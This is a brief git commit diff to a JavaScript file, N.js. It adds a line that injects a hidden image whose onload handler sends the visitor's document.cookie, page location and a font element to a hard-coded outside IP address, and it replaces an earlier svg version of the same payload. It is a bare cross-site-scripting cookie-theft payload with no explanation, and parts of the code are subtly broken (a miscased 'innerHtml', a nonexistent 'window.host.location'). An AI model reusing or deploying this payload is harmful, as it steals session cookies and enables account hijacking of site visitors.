4351e1dda8e52f0fa71d533e768d1fa8b2c41799
zzzkf <zzzykf@gmail.com>
2018-11-23 14:27:49 +0800

    first commit

--- N.js
+++ N.js
@@ -1,1 +1,2 @@
-document.getElementById("test2").innerHtml='<svg style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=" + document.cookie + "&D=" + window.host.location+"&N="+document.getElementsByTagName("font")[0]>';
+document.getElementById("test2").innerHtml='<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=" + document.cookie + "&D=" + window.host.location+"&N="+document.getElementsByTagName("font")[0]>';
+console.log("font = " + document.getElementsByTagName("font")[0]);
